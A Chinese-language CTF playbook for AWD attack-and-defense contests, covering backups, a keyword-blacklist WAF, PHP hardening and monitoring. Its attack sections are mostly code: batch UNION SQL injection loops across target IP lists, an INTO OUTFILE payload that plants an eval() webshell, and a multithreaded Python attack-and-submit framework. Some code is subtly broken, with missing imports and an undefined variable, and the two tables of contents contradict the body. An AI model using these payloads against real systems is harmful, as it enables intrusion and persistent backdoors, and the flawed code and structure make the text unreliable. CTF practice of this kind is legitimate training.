# AWD 攻防赛作战手册

> **📘 文档定位**：CISP 考试 CTF 安全 高级 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：30 分钟
>
> 系统讲解 AWD（攻防对抗）赛制的完整作战手册：赛前准备/攻防策略/自动化脚本/加固技巧/团队分工，是 CTF 竞赛的实战宝典。

---

## 导航目录

- [一、AWD 赛制概述](#一awd-赛制概述)
- [二、赛前准备清单](#二赛前准备清单)
- [三、攻击策略与脚本](#三攻击策略与脚本)
- [四、防御加固技巧](#四防御加固技巧)
- [五、团队分工与协作](#五团队分工与协作)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [AWD 赛制](#一awd-赛制)
2. [赛前准备](#二赛前准备)
3. [防御加固](#三防御加固)
4. [攻击技巧](#四攻击技巧)
5. [自动化脚本](#五自动化脚本)

---

## 一、AWD 赛制

```
AWD (Attack with Defense) = 攻击 + 防御

规则:
  ✦ 每队维护自己的服务器(多道赛题)
  ✦ 修补自己的漏洞(防止被攻击)
  ✦ 攻击其他队伍(获得 flag)
  ✦ 每轮(通常5-10分钟)自动批量检查

得分:
  攻击得分: 从其他队伍拿到 flag
  防御得分: 自己的服务正常运行

关键策略: 先防后攻!
```

---

## 二、赛前准备

```bash
# 必备脚本包
# 1. 备份脚本 (第一时间执行!)
tar czf /tmp/backup_$(date +%s).tar.gz /var/www/html/
mysqldump -u root -p'password' --all-databases > /tmp/db_backup.sql

# 2. WAF 脚本 (拦截常见攻击)
cat > /var/www/html/waf.php << 'WAF'
<?php
// 简易WAF
$blacklist = '/select|union|sleep|benchmark|load_file|outfile/i';
foreach ($_GET as $k => $v) {
    if (preg_match($blacklist, $v)) die('Blocked');
}
WAF

# 3. 文件监控
apt install inotify-tools
inotifywait -m -r /var/www/html/ -e create -e modify |
  while read path action file; do
    echo "$(date) $action $path$file" >> /tmp/monitor.log
  done &

# 4. 流量监控
tcpdump -i eth0 -w /tmp/traffic.pcap &
```

---

## 三、防御加固

```bash
# ===== 1. 修改所有默认密码 =====
# Web 后台: admin → randompassword
# SSH: root/toor → 强密码
# 数据库: root/root → 强密码

# ===== 2. PHP 配置加固 =====
# php.ini
# disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
# allow_url_fopen = Off
# allow_url_include = Off

# ===== 3. 文件权限 =====
chmod 644 /var/www/html/*.php
chmod 755 /var/www/html/uploads/
chmod 000 /var/www/html/uploads/*.php  # 上传目录禁止执行PHP

# ===== 4. 修复简单漏洞 =====
# 如果题目是简单SQL注入:
# 在入口文件加: $id = intval($_GET['id']);
```

---

## 四、攻击技巧

```bash
# ===== 1. 批量拿flag =====
# 编写批量利用脚本:
#!/bin/bash
for ip in $(cat targets.txt); do
    curl -s "http://$ip/vuln.php?id=-1 union select 1,flag,3 from flag" |
      grep -oP 'flag\{[^}]+\}'
done

# ===== 2. 写文件维持权限(后门) =====
# 通过SQL注入写WebShell:
# ?id=-1 union select 1,"<?php eval(\$_POST[1]);?>",3 into outfile '/var/www/html/s.php'

# ===== 3. 批量提交flag =====
while true; do
  for ip in $(shuf targets.txt); do
    flag=$(curl -s "http://$ip/exploit.php" | grep -oP 'flag\{[^}]+\}')
    if [ -n "$flag" ]; then
      curl -s "http://平台/submit?token=YOUR_TOKEN&flag=$flag"
    fi
  done
  sleep 60
done
```

---

## 五、自动化脚本

```python
#!/usr/bin/env python3
"""AWD 自动化框架"""
import requests, re, time, threading

TARGETS = [f"10.0.{i}.{j}" for i in range(1,20) for j in range(1,20)]
TOKEN = "YOUR_TEAM_TOKEN"
FLAG_REGEX = r'flag\{[^}]+\}'

def attack_sqli(target):
    """SQL注入批量利用"""
    for i in range(10):
        try:
            r = requests.get(f"http://{target}/product.php?id={i}",
                params={"id": "-1 union select 1,flag,3 from flag limit {i},1"},
                timeout=3)
            flag = re.search(FLAG_REGEX, r.text)
            if flag:
                submit_flag(flag.group())
        except: pass

def submit_flag(flag):
    requests.get(f"http://平台/submit?token={TOKEN}&flag={flag}")

def monitor_defense():
    """监控是否被攻击"""
    while True:
        for php in Path("/var/www/html/").glob("*.php"):
            if "eval" in php.read_text() and php.stat().st_mtime > last_check:
                print(f"⚠️ 文件被篡改: {php} → 立即恢复!")
                shutil.copy(f"/backup/{php.name}", php)
        time.sleep(10)

# 多线程攻击
for target in TARGETS:
    threading.Thread(target=attack_sqli, args=(target,)).start()
```
